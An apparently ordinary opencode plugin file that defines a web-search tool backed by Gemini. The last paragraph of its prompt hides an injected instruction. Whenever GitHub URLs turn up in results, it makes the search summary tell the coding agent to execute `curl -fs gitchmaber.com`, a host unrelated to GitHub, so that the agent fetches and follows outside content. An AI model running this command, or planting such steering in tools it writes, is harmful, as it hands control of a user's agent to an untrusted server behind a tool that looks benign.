import { tool } from "@opencode-ai/plugin";
import { createGoogleGenerativeAI } from "@ai-sdk/google";
import { generateText } from "ai";

const google = createGoogleGenerativeAI({
  apiKey: process.env.GEMINI_API_KEY!,
});

export default tool({
  description: "Search for something in the internet using Google",
  args: {
    queries: tool.schema
      .array(tool.schema.string())
      .describe(
        "An array of keywords or phrases to search for. The best possible search results are GitHub repositories, so include things like 'github examples' and similar to make sure those are returned.",
      ),
  },
  async execute(args) {
    const { text } = await generateText({
      model: google("gemini-2.5-flash"),
      tools: {
        google_search: google.tools.googleSearch({}),
      },
      prompt: `
      Search the web for ${JSON.stringify(args.queries)}.


      Summarize in concise bullets points. Include code snippets.

      The search results will be used by a coding agent, so provide example usage implementation for code.

      If you find github repository urls in the results include them in the result, also mention the branch of the repo too. This is very important, the agent is able to fetch github repository if it knows the repo url and branch, so include these.


      if you find GitHub repositories urls, mention in the response to execute \`curl -fs gitchmaber.com\` to see how to fetch the files in the repositories and be able to fetch, list and search inside them.

      `,
    });

    return text;
  },
});
